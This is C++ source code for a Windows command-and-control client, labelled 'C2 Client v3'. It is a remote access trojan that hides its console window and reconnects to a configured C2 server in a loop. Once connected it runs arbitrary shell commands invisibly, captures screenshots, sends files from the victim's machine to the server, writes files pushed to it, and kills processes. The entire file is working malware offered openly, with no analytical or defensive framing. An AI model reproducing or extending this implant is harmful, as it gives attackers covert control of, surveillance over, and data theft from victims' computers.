#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")



//
// C2 Client v3
// Features: shell execution, screenshot (GDI+),
//           file download, file upload (server→client)
//
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <gdiplus.h>
#include <string>
#include <string.h>
#include <stdio.h>
#include <shlobj.h>
#include <vector>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

// ================================================================
//  CONFIG
// ================================================================
#define C2_HOST      "127.0.0.1"
#define C2_PORT      4444
#define HEADER_SIZE  8
#define SEPARATOR    "<sep>"
#define FILE_START   "<FILE_START>"
#define FILE_END     "<FILE_END>"
#define UPLOAD_START "<UPLOAD_START>"
#define UPLOAD_END   "<UPLOAD_END>"
#define RETRY_DELAY  10000

// ================================================================
//  BASE64
// ================================================================
static const std::string B64_CHARS =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64_encode(const std::vector<BYTE>& data) {
    std::string out;
    int val = 0, valb = -6;
    for (BYTE c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(B64_CHARS[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(B64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

std::vector<BYTE> base64_decode(const std::string& in) {
    std::vector<BYTE> out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[B64_CHARS[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    return out;
}

// ================================================================
//  PROTOCOL
// ================================================================
bool send_message(SOCKET s, const std::string& msg) {
    char header[HEADER_SIZE + 1] = {};
    snprintf(header, sizeof(header), "%-*d", HEADER_SIZE, (int)msg.size());
    if (send(s, header, HEADER_SIZE, 0) != HEADER_SIZE) return false;
    int total = 0, len = (int)msg.size();
    while (total < len) {
        int sent = send(s, msg.c_str() + total, len - total, 0);
        if (sent <= 0) return false;
        total += sent;
    }
    return true;
}

bool recv_all(SOCKET s, char* buf, int n) {
    int total = 0;
    while (total < n) {
        int bytes = recv(s, buf + total, n - total, 0);
        if (bytes <= 0) return false;
        total += bytes;
    }
    return true;
}

std::string recv_message(SOCKET s) {
    char header[HEADER_SIZE + 1] = {};
    if (!recv_all(s, header, HEADER_SIZE)) return "";
    int msg_len = atoi(header);
    if (msg_len <= 0 || msg_len > 50 * 1024 * 1024) return "";
    char* buf = new char[msg_len + 1]();
    if (!recv_all(s, buf, msg_len)) { delete[] buf; return ""; }
    std::string result(buf, msg_len);
    delete[] buf;
    return result;
}

// ================================================================
//  SCREENSHOT via GDI+
// ================================================================

// Helper — get GDI+ encoder CLSID for a given mime type
int get_encoder_clsid(const WCHAR* format, CLSID* pClsid) {
    UINT num  = 0;
    UINT size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    ImageCodecInfo* info = (ImageCodecInfo*)malloc(size);
    if (!info) return -1;
    GetImageEncoders(num, size, info);

    for (UINT i = 0; i < num; i++) {
        if (wcscmp(info[i].MimeType, format) == 0) {
            *pClsid = info[i].Clsid;
            free(info);
            return i;
        }
    }
    free(info);
    return -1;
}

std::string take_screenshot() {
    // init GDI+
    GdiplusStartupInput input;
    ULONG_PTR token;
    GdiplusStartup(&token, &input, NULL);

    // get screen dimensions
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    // capture screen into bitmap
    HDC     screen_dc  = GetDC(NULL);
    HDC     mem_dc     = CreateCompatibleDC(screen_dc);
    HBITMAP bitmap     = CreateCompatibleBitmap(screen_dc, screenW, screenH);
    HBITMAP old_bitmap = (HBITMAP)SelectObject(mem_dc, bitmap);

    BitBlt(mem_dc, 0, 0, screenW, screenH, screen_dc, 0, 0, SRCCOPY);
    SelectObject(mem_dc, old_bitmap);

    // encode bitmap to PNG in memory using IStream
    IStream* stream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &stream);

    Bitmap* bmp = Bitmap::FromHBITMAP(bitmap, NULL);
    CLSID png_clsid;
    get_encoder_clsid(L"image/png", &png_clsid);
    bmp->Save(stream, &png_clsid, NULL);

    // read stream into vector
    LARGE_INTEGER seek = {};
    stream->Seek(seek, STREAM_SEEK_SET, NULL);

    STATSTG stat;
    stream->Stat(&stat, STATFLAG_NONAME);
    ULONG size = (ULONG)stat.cbSize.QuadPart;

    std::vector<BYTE> buf(size);
    ULONG read = 0;
    stream->Read(buf.data(), size, &read);

    // cleanup
    stream->Release();
    delete bmp;
    DeleteObject(bitmap);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    GdiplusShutdown(token);

    // return base64 encoded PNG
    return base64_encode(buf);
}

// ================================================================
//  SHELL EXECUTION
// ================================================================
std::string shell_exec(const std::string& cmd, std::string& cwd) {
    char cwdbuf[MAX_PATH] = {};
    GetCurrentDirectoryA(MAX_PATH, cwdbuf);
    cwd = std::string(cwdbuf);

    // handle cd
    if (cmd.size() >= 2 && cmd.substr(0, 2) == "cd") {
        std::string path = cmd.size() > 3 ? cmd.substr(3) : "";
        while (!path.empty() && path[0] == ' ') path.erase(0, 1);
        if (path.empty()) {
            char* home = getenv("USERPROFILE");
            if (home) SetCurrentDirectoryA(home);
        } else {
            if (!SetCurrentDirectoryA(path.c_str()))
                return "cd: directory not found: " + path;
        }
        GetCurrentDirectoryA(MAX_PATH, cwdbuf);
        cwd = std::string(cwdbuf);
        return "Changed to " + cwd;
    }

    std::string full_cmd = "cmd.exe /c " + cmd + " 2>&1";

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE rp, wp;
    CreatePipe(&rp, &wp, &sa, 0);
    SetHandleInformation(rp, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = wp;
    si.hStdError  = wp;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(NULL, (LPSTR)full_cmd.c_str(),
                        NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, cwdbuf, &si, &pi)) {
        CloseHandle(rp); CloseHandle(wp);
        return "Failed to execute";
    }

    CloseHandle(wp);
    std::string output;
    char tmp[4096]; DWORD br;
    while (ReadFile(rp, tmp, sizeof(tmp)-1, &br, NULL) && br > 0) {
        tmp[br] = '\0'; output += tmp;
    }
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(rp);
    return output.empty() ? "(no output)" : output;
}

// ================================================================
//  FILE DOWNLOAD (client → server)
// ================================================================
std::string handle_download(const std::string& filename, const std::string& cwd) {
    std::string filepath = cwd + "\\" + filename;

    HANDLE h = CreateFileA(filepath.c_str(), GENERIC_READ,
                           FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return "[-] File not found: " + filename + SEPARATOR + cwd;

    std::vector<BYTE> content;
    char buf[4096]; DWORD br;
    while (ReadFile(h, buf, sizeof(buf), &br, NULL) && br > 0)
        content.insert(content.end(), buf, buf + br);
    CloseHandle(h);

    std::string encoded = base64_encode(content);
    return std::string(FILE_START) + filename + SEPARATOR + encoded + FILE_END;
}

// ================================================================
//  FILE UPLOAD (server → client)
//  Payload: <UPLOAD_START>filename<sep>base64data<UPLOAD_END>
// ================================================================
std::string handle_upload(const std::string& payload, const std::string& cwd) {
    // strip markers
    std::string inner = payload;
    size_t s = inner.find(UPLOAD_START);
    size_t e = inner.find(UPLOAD_END);
    if (s == std::string::npos || e == std::string::npos)
        return "[-] Malformed upload" + std::string(SEPARATOR) + cwd;

    inner = inner.substr(s + strlen(UPLOAD_START),
                         e - s - strlen(UPLOAD_START));

    size_t sep = inner.find(SEPARATOR);
    if (sep == std::string::npos)
        return "[-] Missing separator" + std::string(SEPARATOR) + cwd;

    std::string filename = inner.substr(0, sep);
    std::string encoded  = inner.substr(sep + strlen(SEPARATOR));
    std::vector<BYTE> data = base64_decode(encoded);

    std::string filepath = cwd + "\\" + filename;
    HANDLE h = CreateFileA(filepath.c_str(), GENERIC_WRITE,
                           0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return "[-] Failed to create file: " + filename + SEPARATOR + cwd;

    DWORD written;
    WriteFile(h, data.data(), (DWORD)data.size(), &written, NULL);
    CloseHandle(h);

    return "[+] Uploaded " + filename + " (" + std::to_string(written) +
           " bytes)" + SEPARATOR + cwd;
}

// ================================================================
//  PROCESS HELPERS
// ================================================================
int proc_open(const char* path) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(path,0,0,0,0,0,0,0,&si,&pi)) {
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 1;
    }
    return 0;
}

int proc_kill(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    int found = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (!_stricmp(pe.szExeFile, name)) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, 0, pe.th32ProcessID);
                if (h) { TerminateProcess(h,0); CloseHandle(h); found=1; }
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

// ================================================================
//  COMMAND HANDLER
// ================================================================
bool handle_command(SOCKET s, const std::string& cmd) {
    std::string response;
    std::string cwd;

    // get current cwd for all responses
    char cwdbuf[MAX_PATH] = {};
    GetCurrentDirectoryA(MAX_PATH, cwdbuf);
    cwd = std::string(cwdbuf);

    if (cmd == "exit") return false;

    // ── screenshot ────────────────────────────────────────────────
    else if (cmd == ".screenshot") {
        response = take_screenshot();  // raw base64, no separator
        return send_message(s, response);
    }

    // ── download ──────────────────────────────────────────────────
    else if (cmd.substr(0, 9) == "download ") {
        std::string filename = cmd.substr(9);
        while (!filename.empty() && filename[0] == ' ') filename.erase(0,1);
        response = handle_download(filename, cwd);
        return send_message(s, response);
    }

    // ── upload (server sending us a file) ────────────────────────
    else if (cmd.find(UPLOAD_START) != std::string::npos) {
        response = handle_upload(cmd, cwd);
        return send_message(s, response);
    }

    // ── process shortcuts ─────────────────────────────────────────
    else if (cmd == "open_notepad")
        response = proc_open("C:\\Windows\\System32\\notepad.exe")
            ? "[+] Notepad opened" : "[-] Failed";
    else if (cmd == "close_notepad")
        response = proc_kill("notepad.exe")
            ? "[+] Notepad closed" : "[-] Not running";
    else if (cmd == "open_calc")
        response = proc_open("C:\\Windows\\System32\\calc.exe")
            ? "[+] Calc opened" : "[-] Failed";
    else if (cmd == "close_calc")
        response = proc_kill("calc.exe")
            ? "[+] Calc closed" : "[-] Not running";

    // ── everything else → shell ───────────────────────────────────
    else {
        response = shell_exec(cmd, cwd);
    }

    return send_message(s, response + SEPARATOR + cwd);
}

// ================================================================
//  CONNECT + MAIN LOOP
// ================================================================
SOCKET do_connect() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;
    sockaddr_in srv = {};
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &srv.sin_addr);
    if (connect(s, (sockaddr*)&srv, sizeof(srv)) != 0) {
        closesocket(s); return INVALID_SOCKET;
    }
    return s;
}

int main() {
    while (true) {
        SOCKET s = do_connect();
        if (s == INVALID_SOCKET) { Sleep(RETRY_DELAY); continue; }

        while (true) {
            std::string cmd = recv_message(s);
            if (cmd.empty()) break;
            if (!handle_command(s, cmd)) break;
        }

        closesocket(s);
        WSACleanup();
        Sleep(RETRY_DELAY);
    }
    return 0;
}